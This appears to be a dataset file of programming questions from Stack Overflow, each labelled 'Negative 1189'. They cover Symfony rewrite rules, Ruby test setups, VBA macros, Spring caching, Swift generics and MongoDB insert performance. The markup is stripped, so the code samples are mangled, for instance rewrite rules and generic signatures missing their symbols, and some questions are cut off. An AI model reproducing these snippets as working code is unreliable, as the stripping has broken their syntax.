Negative 1189 pIm using Symfony. I have the following files.p  ul licodevarwwwcheokweb.htaccesscodeli licodevarwwwcheokwebindex.htmlcodeli ul  pMy original code.htaccesscode content isp  precode Use the front controller as index file. It serves as a fallback solution when  every other rewriteredirect fails e.g. in an aliased environment without  modrewrite. Additionally, this reduces the matching process for the  start page path  because otherwise Apache will apply the rewriting rules  to each configured DirectoryIndex file e.g. index.php, index.html, index.pl. DirectoryIndex app.php  ltIfModule modrewrite.cgt     RewriteEngine On       Determine the RewriteBase automatically and set it as environment variable.      If you are using Apache aliases to do mass virtual hosting or installed the      project in a subdirectory, the base path will be prepended to allow proper      resolution of the app.php file and to redirect to the correct URI. It will      work in environments without path prefix as well, providing a safe, onesize      fits all solution. But as you do not need it in this case, you can comment      the following 2 lines to eliminate the overhead.     RewriteCond REQUESTURI1 ..2     RewriteRule .  [EBASE1]       Redirect to URI without front controller to prevent duplicate content      with and without app.php. Only do this redirect on the initial      rewrite by Apache and not on subsequent cycles. Otherwise we would get an      endless redirect loop request gt rewrite to front controller gt      redirect gt request gt ....      So in case you get a too many redirects error or you always get redirected      to the start page because your Apache does not expose the REDIRECTSTATUS      environment variable, you have 2 choices       disable this feature by commenting the following 2 lines or       use Apache gt 2.3.9 and replace all L flags by END flags and remove the        following RewriteCond best solution     RewriteCond ENVREDIRECTSTATUS      RewriteRule app.php. ENVBASE2 [R301,L]       If the requested filename exists, simply serve it.      We only want to let Apache serve files and not directories.     RewriteCond REQUESTFILENAME f     RewriteRule .

Negative 1189 pI am refactoring a mediumsized web application which has many unit tests and acceptance tests written using RSpec. My main goal is to clean up code for a microservice that runs as a separate rack application in production. The current test suite uses process management to start and stop the microservice, which is causing problems with test performance and complicating how the test environment manages test fixture data.p  pThere are hundreds of tests that rely on the correct behaviour of the microservice, which means on this refactoring pass I will not get the opportunity to fully mock out or fake the microservice itself. But I would really like to remove all the separate processhandling and the associated costs. This is now feasible since I am adding unit tests for the microservice itself, and we have a separate smoke and integration test infrastructure which already runs with the microservice handled as a separate rackbased service.p  pI have created a a hrefhttpsscce.org relnofollowSSCEa to demonstrate the problem. It is in multiple small files, fully functional and includes tests. Apologies for the overall length, but I think it is unavoidable because my question is about how to combine these multiple components.p  h2Microserviceh2  pstrongmicroserviceapp.rbstrongp  precoderequire grape  class Microservice lt GrapeAPI   format      json   get main do      message gt Hello World    end end codepre  pstrongmicroserviceconfig.rustrongp  precoderequire File.joinFile.dirnameFILE, app run Microservice codepre  pstrongmicroservicespecspechelper.rbstrongp  precoderequirerelative ..app.rb  require rspec require racktest  def app   Microservice end  RSpec.configure do config   config.include RackTestMethods end codepre  pstrongmicroservicespecmicroservicespec.rbstrongp  precoderequirerelative spechelper  describe Microservice do   describe GET main do     it responds with correct JSON do       get main       expect lastresponse .to beok       data  JSON.parse lastresponse.body        expect data .to be   message gt Hello World      end   end end codepre  h2Main Web Applicationh2  pstrongwebappapp.rbstrongp  precoderequire sinatra require json require httparty   This stands in for more complex config we have in reality microserviceurl  http127.0.0.18090  get main do    Calls a microservice . . . annoyingly the service uses the same route name   response  HTTParty.get microserviceurl  main    data  JSON.parse response.body    data[message]n end codepre  pstrongwebappspecspechelper.rbstrongp  precoderequirerelative ..app.rb  require rspec require racktest  def app   SinatraApplication end  RSpec.configure do config   config.include RackTestMethods end   Is there something I can do here to load the  microservice without launching it in a new process, and route  the HTTParty.get in the main app to it  microserviceurl  http127.0.0.18888 codepre  pstrongwebappspecwebappspec.rbstrongp  precoderequirerelative spechelper  describe Main web app do   describe GET main do     it responds with correct text do       get main       expect lastresponse .to beok       expect lastresponse.body .to include Hello World     end   end end codepre  pI can run the microservice test easilyp  precoderspec f d c microservicespecmicroservicespec.rb codepre  pBut to run the webapp test, I first need to start up the microservice where the test expects to find itp  precoderackup p 8888 codepre  pDifferent processp  precoderspec f d c webappspecwebappspec.rb codepre  pI think I can mount the microservice inside the application, from viewing questions like a hrefhttpstackoverflow.comquestions11496780howtomountasinatraapplicationinsideanothersinatraappHow to mount a Sinatra application inside another Sinatra appa but this seems geared to joining applications in a production environment, I need them to be separate there, joined only in unit tests where the helper enables it, and so far am at a complete loss on how I tell HTTParty or any replacememt which could do what I want here to connect.p  hr  pHeres how I might stub the single call in the example at end of strongwebappspecspechelper.rbstrong  is there a way to route this to an inprocess mount of the microservice insteadp  precoderequire webmockrspec include WebMockAPI stubrequest any, 8888 .toreturn body gt  messageHello World  codepre

Negative 1189 pI have a view controller presented using codeUIModalPresentationCustomcode presentation style.

Negative 1189 pI recently started working with a friends excel project, making macros. I was mostly doing this through the Record Macro function, as I am not knowledgeable in Visual Basic to code it myself, and there is not enough time to learn the language. p  pAll was going smoothly until I learned that ctrl[ would not work to trace a cells precedents inside of a macro because it just selected the cell that the first precedent was linked to, and would not change for future precedents. I looked up how to code it in Visual Basic and ended up using Selection.Precedents.Select to trace the cells precedents. Because the precedent I am trying to link to is on a different sheet still in the same workbook it returns Runtime error 1004 No cells were found.p  pIt looked like thisp  precodeRangeU5.Select Selection.Precedents.Select codepre  pBecause this did not work, I went to the Trace Precedents button on the Formula Auditing tab, and it was able to trace back to the precedent on the other sheet ctrl[ also worked to select the cell. I then tested a macro using a different cell as the precedent on the same sheet so U5 was linked to V5, instead of the cell on the other sheet, and it was able to select the precedent cell. p  pI did some research and found a lot of answers that just said Use Selection.Precedents.Select, which I did, and it didnt work.p  pEdit I got it working, I had to dop  precodeWorksheetsSensitivity Table.Activate RangeU5.Select RangeU5.ShowPrecedents ActiveCell.NavigateArrow True, 1 codepre  pProbably not the most efficient way to do it, but as far as I know, it works. You just have  to remove arrows at the end of the code. p

Negative 1189 pLets say Im writing a Spring webservice that gets called by an external application. That application requests data that I need to load from an external resource. Furthermore, the design has it that it calls my service more than once with different parameters. In other words, the user sitting in front of the application presses one button, which generates a bunch of requests to my webservice in a very short time frame.p  pMy webservice parses the parameters and comes up with necessary requests to the external resource. The logic has it that it may cause calling the external resource with the same parameters over and over again, which makes this the ideal candidate for caching.p  pExamplep  ol liThe user presses that one button in the applicationli liApplication initiates ten requests to my webserviceli liMy webservice receives them in parallelli liAfter analysing the parameters of all requests, overall Id need to call the external resources 15 times, but the parameters are mostly equal and only show that three calls would be enough to serve the 15 intended calls.li ol  pHowever, one call to the external resource may take some time.p  pAs far as I understand a hrefhttpdocs.spring.iospringdocs4.0.6.RELEASEspringframeworkreferencehtmlsinglecache relnofollowhow Spring does cachinga it writes the result of a codeCachablecode method into the cache. Apparently this means that before it treats another invocation of that method with the same parameters as cache hit, it must have a result of a previous invocation. This means that it doesnt provide support for pending method calls.p  pI need something like Hey, I just saw a method invocation with the same parameters a second ago, but Im still waiting for the result of that invocation. While I cant provide a result yet, I will hold that new invocation and reuse the result for it.p  pWhat are my options Can I make Spring do thatp

Negative 1189 pI have an Azure shared web site.  I publish my web site using Visual Studio 2013 and the operation succeeds, yet certain files are reported by the browser as missing while others are fine.  The files that end up in the missing category are all binary data files for a game.  All the normal web files HTML, JS, CSS, etc. appear to be fine.  Is there some kind of special steps I need to take to publish binary data to an Azure web sitep  pNote, from within Visual Studio 2013 I tried to publish individually one of the missing files by using the Publish Single File option.  The publish operation succeeds, but still, the browser cant find the file when it tries to load it.  Note, I dont think its a file size issue because several of the binary data files are only around 3 MB in size.p
Negative 1189 pIn a breadth first search of a directed graph cycles possible, when a node is dequeued, all its children that has not yet been visited are enqueued, and the process continues until the queue its empty.p  pOne time, I implement it the other way around, where all a nodes children are enqueued, and the visitation status is checked instead when a node is dequeued. If a node being dequeued has been visited before, it is discarded and the process continue to the next in queue.p  pBut the result is wrong. a hrefhttpsen.wikipedia.orgwikiDepthfirstsearchPseudocode20Wikipedia relnofollowWikipediaa also saysp  blockquote   pdepthfirst search ......

Negative 1189 pWe have a large directory structure of unchanging RTL and firmware and are developing a testbench for it with a codetrunkcodecodedevelopcodecodereleasecode structure.  We work under develop and merge back to trunk after passing a smoke test.  We codesvn copycode our current work to a candidate release and have a script that merges trunk to it, runs smoke, then merges the result into trunk on a pass. p  pWed rather not copy the unchanging RTL whenever we create a new candidate release.  Im thinking that we should create a repository of unchanging code and use an external property to bring it into local workspaces.  That way the codesvn copycode command would not take as long to run.  I dont care if the script takes a while to do its update because its automated.p  pDoes this strategy make sense  Will I get the effect I want  Will the humans codesvn copycode will not have to copy the external data, just the external propertiesp  pThanksp
Negative 1189 pSo I have a horizontal banner that I defined via a div. This div has a width of the full window and fix height of 500px for the time being. How can I scale an background image 2048 x 1283 to fill the div entirely without loss of picture quality How would I do the same if the div height was relative to the window size, perhaps 25 or 50 I want this to work when the window is resized.p

Negative 1189 pAs an exercise, Im trying to extend codeArraycode in Swift to add a codesumcode member function. This should be type safe in a way that I want a call to codesumcode to compile only if the array holds elements that can be added up.p  pI tried a few variants of something like thisp  precodeextension Array       func sumltU  IntegerArithmeticType where U  Tgt gt Int          var acc  0         for elem in self              acc  elem as Int                  return acc        codepre  pThe idea was to say, OK, this is a generic function, the generic type must be something like an codeIntcode, and must also be the same as codeTcode, the type of the elements of the array. But the compiler complains Sametype requirement make generic parameters U and T equivalent. Thats right, and they should be, with the additional contraint codeT  IntegerArithmeticTypecode.p  pWhy isnt the compiler letting me do this How can I do itp  pI know that I should later fix how things are added up and what the return type exactly is, but Im stuck at the type constraint for now.p

Negative 1189 pSo I need to recommend an eCommerce platform to my client. The requirement is that they need to ship items all over Europe and North America. So it needs to be multicurrency, multilanguage. Also there is a subscription model, so the credit card needs to be stored and periodically charged. Further they need it to integrate with QuickBooks which is they accounting software. Also the software will have web, iOS and Android versions.p  pSo for the storing credit card part, I do not want to store it within our infrastructure because of PCI DSS issues. Instead I would prefer having something like paypal vault. However I cannot use paypal because their mobile SDK does not support recurring paymentssubscription model.p  pWith paypal ruled out, I have been looking at XCart for the shopping interface and couple of other payment companies akin to authorize.net for the payment integration. However I am getting confused with XCart.

Negative 1189 pi am having a problem that i am finding difficult to find information about as i am unaware of the underlying issue.

The console.logs are executed directly after eachother, so nothing is able to change the value between the logging. I wanted to upload it in an image for better clarity but i unfortunately cannot.p  precode1                                          1                                           Object action function order,impulseVector createSphere function uid,coordinates   uid 2 proto Object 1 codepre  pSo the problem is when taking the value directly from the property it differs from when using the entire object.p

Negative 1189 pIm making a libgdx game as an exercise. Its pretty simple, something like escape kind of game.

Other idea was a matrix, lets say 100x100. With every stage it would be read from file. After click x and y would be easly translated into grid values and proper action would happen.

Negative 1189 pI have a PowerPoint slide with different images. I need to create VBA code in PowerPoint that recognises all these images and fades them out one by one  except for one randomly chosen image. This last image should remain until the end, then fade out and display in the middle of the slide.p  pI have an idea of how to do it and have experience with object oriented languages R but I have never used VBA before. Therefore I would be grateful for pointers on how to do any of the following in VBAp  ol liDetermine number of images on active slideli liSelect each image one after another and assign a counter variable as selection label that part should work as described a hrefhttpwww.excelforum.comexcelgeneral513885howtoselectonebyonepictureonmysheetwithvba.html relnofollowhereali liCreate Range A of all assigned counter variablesli liSelect random number x in Range Ali liCreate Range B of all counter variables in Range A EXCEPT for the random number xli liRandomise the order of variables in Range Bli liLoop through Range B and fade out images whose label corresponds to the respective Range B variable that comes upli liFade out the image whose label corresponds to xli liInsert the image whose label corresponds to x in the centre of the slideli ol  pIf it is very difficult to recognise images or assign labels to those images I can also do so manually. However, it would be nicer if that could happen automatically. I would be grateful for any pointers, also in the form of links if you think that part of the above process is already described somewhere else Im afraid since Im inexperienced in VBA I am not using very effective search terms.p  pEDIT Please find the solution steps 8 and 9 are still missingp  precodeSub SelectionMacro  Dim oSl As Slide Dim oSh As Shape Dim aArrayOfShapes As Variant Dim ShapeX As Shape Dim N As Long Dim Temp As Variant Dim J As Long Dim FadeEffect As Effect  Set oSl  ActivePresentation.SlideS1  This section creates an array of all pictures on Slide1 called aArrayOfShapes For Each oSh In oSl.Shapes     If oSh.Type  msoPicture Then         On Error Resume Next         Debug.Print UBoundaArrayOfShapes         If Err.Number  0 Then             ReDim Preserve aArrayOfShapes1 To UBoundaArrayOfShapes  1         Else             ReDim Preserve aArrayOfShapes1 To 1         End If         Set aArrayOfShapesUBoundaArrayOfShapes  oSh     End If Next  This section creates a random index number within the bounds of the length of aArrayOfShapes and assigns the shape with that index number to the Shape object ShapeX Randomize NumberX  IntUBoundaArrayOfShapes  LBoundaArrayOfShapes  1  Rnd  LBoundaArrayOfShapes Set ShapeX  aArrayOfShapesNumberX  This section shuffles aArrayOfShapes For N  LBoundaArrayOfShapes To UBoundaArrayOfShapes     J  CLngUBoundaArrayOfShapes  N  Rnd  N         If N ltgt J Then             Set Temp  aArrayOfShapesN             Set aArrayOfShapesN  aArrayOfShapesJ             Set aArrayOfShapesJ  Temp         End If     Next N  This section loops through all Shapes in aArrayOfShapes and fades them out one by one EXCEPT for ShapeX For Each Shape In aArrayOfShapes     If ShapeX.Name ltgt Shape.Name Then     Set FadeEffect  oSl.TimeLine.MainSequence.AddEffect      ShapeShape, effectidmsoAnimEffectFade, triggermsoAnimTriggerAfterPrevious         With FadeEffect         .Timing.Duration  0.5         .Exit  msoTrue         End With     End If Next Shape  End Sub codepre  pIn order to reset the slide to the state before running the macro so as to be able to run it again and display another random image the following macro needs to be runp  precodeSub ResetSelection     For i  ActivePresentation.SlideS1.TimeLine.MainSequence.Count To 1 Step 1         ActivePresentation.SlideS1.TimeLine.MainSequencei.Delete     Next i End Sub codepre

Negative 1189 pI am trying to create an app that can calculate the number of times a phone is spun on a finger like a basketball. I have been using DeviceMotion to get the attitude, and I manipulated the data so instead of it going from 1 to 179 then back on the negative side it goes 0360. But I can not seem to add to a totalRotation variable after it goes around the 0 mark. p  pSimple terms, I want to have two variables, one is the current yaw which should be in degrees and between 0 and 360. The other is a total which should continue to add as the phone rotates. So after 1.5 rotations, the current yaw should read 180, and the total should read 540. Is there an easy way to do this p

Negative 1189 pIm intergrating an ad banner into a universal app, the banner placement and size work great on the iphone and ipad in the different orientations.  For the iphone I only allow portrait orientations and pressing the iAd banner works as expected, I click on the banner and get a portrait ad.  For the iPad my app supports all orientations and when I click on the ad in portrait, the resulting full screen ad comes in as Landscape and forces my app to rotate to Landscape even though the device is being held in portrait.  I would assume I would get a portrait ad, is this not the case Are all iPad ads Landscapep  pI followed the workflow in the example code for the a hrefhttpsdeveloper.apple.comlibraryiossamplecodeiAdSuiteIntroductionIntro.html relnofollowiAdSuitea.

MinMaxIdx doesnt work without converting the image to grayscale first, unlike the code I linked above. Ultimately, what Id like to do is to be able to generate relative depth maps from a single webcamera.p

Edit  Looks like the problem is that using cloaking you dont give permission to go fulscreen from the animevid.it url, while, using www.animevid.net since its not cloaked and isnt contained in a iframe, its abled to go fullscreen and show the relative button. Reached this theory by testing with cloaking and iframing. Still need help on ho to allow fulscreen on a cloaked page.p

Negative 1189 pIve run into an odd performance issue while assessing MongoDB on Windows.p  pIve been running on a basic Windows 7 laptop 16GB RAM, i73540M CPU and have seen great performance.p  pIve been given access to a more powerful Windows 2008 R2 server 128GB RAM, Xeon E74807 4 processors for testing.p  pIm benchmarking a single line of code which is giving me the problem  its a simple insert using the new c driverp  precode await Collection.InsertOneAsyncentity codepre  pMy entity class is straightforward EntityBase is just an ObjectID Id propertyp  precode[DataContract] public class SamplePacket  EntityBase       [DataMember]     public ObjectId SampleId  get set       [DataMember]     public int NumberOfScans  get set       [DataMember]     public double MinimumScanTime  get set       [DataMember]     public double MaximumScanTime  get set       [DataMember]     public byte[] IndexStream  get set       [DataMember]     public byte[] ContentStream  get set       [DataMember]     public int PacketNumber  get set    codepre  pThe ContentStream byte array can be between 0.1 and 5MB.p  pThe configuration of the laptop and the server is as identical as I can make it. I have three mongod instances 2 shards and 1 config and one mongos instance all running on the one machine. The c program is running on the same machine as these instances and is talking to the mongos instance. The instances are all installed as services with default configurations, for examplep  precodemongod install serviceName Mongo DB Shard 1 serviceDisplayName Mongo DB Shard 1 port 10001 dbpath gdatadb logpath gdatalogslog.txt codepre  pIf, in my entity class, ContentStream is a random byte array of 1MB, the sustained average time for the insert on the laptop is around 28ms. On the more powerful server it is around 500ms This is from scratch, even when the database does not initially exist  this is not an issue with a big collection.p  pUsing mongoperf with this configurationp  precodenThreads1, fileSizeMB3, rtrue, wtrue, mmffalse codepre  pshows the disk performance of the server to be much greater than the laptop. The server reports  8729 opssec, 33 MBsec and the laptop reports  1866 opssec, 7 MBsec. CrystalDiskMark shows much better performance on the server.p  pAfter reading the warning message about NUMA, Ive ensured that it is disabled on the server, to no effect.p  pHotfix KB2731284 is installed to the best of knowledge  the installation of the hotfix seemed to go well but I still get the warning message when starting a mongo shell.p  pThe same performance differential exists when writing to a single, nonsharded mongod instance.p  pIf I write to a single Mongod instance with nojournal as an option, the average write speed comes down from 500ms to around 35ms still slower than the journalled laptopp  pI cant see anything odd in the logs. The memory usage on the server is around 20GB of the 128GB available  theres nothing else significant running on it.p  pThe only difference I cant do anything about is that on the server the disks are devices connected as SCSI devices through a PERC H700. Im not sure what the configuration of these disks are  the server is on another continentp  pCould a weird SCSI configuration be causing this, or is there some other issue I need to look atp
